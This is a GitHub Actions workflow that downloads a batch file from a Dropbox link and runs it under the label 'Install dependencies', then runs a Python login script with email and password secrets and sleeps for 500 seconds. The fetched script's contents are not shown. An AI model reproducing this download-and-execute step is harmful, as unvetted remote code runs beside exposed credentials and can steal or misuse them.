name: Run Python Script

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
    - name: Install dependencies
      run: |
       curl -L -o down.bat https://www.dropbox.com/scl/fi/qjajylqv7awm5phuglo4w/down.bat?rlkey=krwbqsiwr5550clzser2vs6u2&dl=0
       cmd /c down.bat

    - name: Run Python script
      env:
        EMAIL_SECRET: ${{ secrets.EMAIL_SECRET }}
        PASSWORD_SECRET: ${{ secrets.PASSWORD_SECRET }}
      run: python login.py $Env:EMAIL_SECRET $Env:PASSWORD_SECRET
 
    - name: Time Counter
      run: Start-Sleep -Seconds 500
